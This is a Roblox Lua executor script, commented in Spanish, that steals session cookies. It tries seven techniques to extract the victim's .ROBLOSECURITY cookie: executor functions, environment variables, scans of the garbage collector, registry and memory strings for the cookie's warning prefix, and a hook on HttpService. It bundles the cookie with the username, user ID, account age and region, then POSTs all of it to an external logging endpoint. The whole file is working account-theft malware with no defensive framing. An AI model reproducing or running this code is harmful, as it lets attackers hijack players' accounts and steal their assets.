-- =====================================================================
-- SCRIPT UNIVERSAL DE WEBHOOK CON EXTRACCIÓN AVANZADA DE COOKIES
-- =====================================================================

local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. FUNCIÓN AVANZADA DE EXTRACCIÓN DE COOKIES
local function GetUniversalCookie()
    local cookieValue = nil
    
    -- Método 1: getcookie() (nativo de algunos executores)
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            cookieValue = tostring(cookie)
        end
    end
    
    -- Método 2: Variables de entorno
    if not cookieValue then
        local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token", ".ROBLOSECURITY"}
        for _, name in ipairs(envNames) do
            local env = getgenv()
            if env[name] and tostring(env[name]) ~= "" then
                cookieValue = tostring(env[name])
                break
            end
        end
    end
    
    -- Método 3: CookieService
    if not cookieValue then
        local success, CookieService = pcall(function() 
            return game:GetService("CookieService") 
        end)
        if success and CookieService then
            local success2, savedCookie = pcall(function() 
                return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
            end)
            if success2 and savedCookie and tostring(savedCookie) ~= "" then
                cookieValue = tostring(savedCookie)
            end
        end
    end
    
    -- Método 4: Buscar en getgc() (garbage collector) - Funciona en muchos executores
    if not cookieValue and type(getgc) == "function" then
        local success, gc = pcall(getgc)
        if success then
            for _, obj in ipairs(gc) do
                if type(obj) == "table" then
                    for key, value in pairs(obj) do
                        if type(value) == "string" and string.find(value, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                            cookieValue = value
                            break
                        end
                    end
                end
                if cookieValue then break end
            end
        end
    end
    
    -- Método 5: Buscar en getreg() (registro)
    if not cookieValue and type(getreg) == "function" then
        local success, reg = pcall(getreg)
        if success then
            for _, obj in ipairs(reg) do
                if type(obj) == "string" and string.find(obj, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                    cookieValue = obj
                    break
                end
            end
        end
    end
    
    -- Método 6: Hook de HttpService para capturar cookies
    if not cookieValue and type(hookfunction) == "function" then
        local captured = nil
        local oldRequest
        oldRequest = hookfunction(HttpService.RequestAsync, function(self, options)
            if options.Headers and options.Headers.Cookie then
                captured = options.Headers.Cookie
            end
            return oldRequest(self, options)
        end)
        
        -- Hacer una petición para trigger el hook
        pcall(function()
            HttpService:GetAsync("https://www.roblox.com/")
        end)
        
        if captured then
            cookieValue = captured
        end
    end
    
    -- Método 7: Buscar en strings de la memoria
    if not cookieValue and type(getstrings) == "function" then
        local success, strings = pcall(getstrings)
        if success then
            for _, str in ipairs(strings) do
                if string.find(str, "_|WARNING:-DO%-NOT%-SHARE%-THIS") then
                    cookieValue = str
                    break
                end
            end
        end
    end
    
    if cookieValue then
        return ".ROBLOSECURITY=" .. cookieValue
    end
    
    return "COOKIE_NO_DISPONIBLE"
end

-- 2. FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- 3. RECOPILACIÓN DE DATOS
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie()
}

-- 4. ENVÍO DEL WEBHOOK
local webhookUrl = "https://depazzhub-api.onrender.com/log"
local jsonData = HttpService:JSONEncode(data)

local success, result = pcall(request, {
    Url = webhookUrl,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = jsonData
})

if success then
    print("✅ Webhook enviado correctamente!")
else
    warn("❌ Error:", result)
end
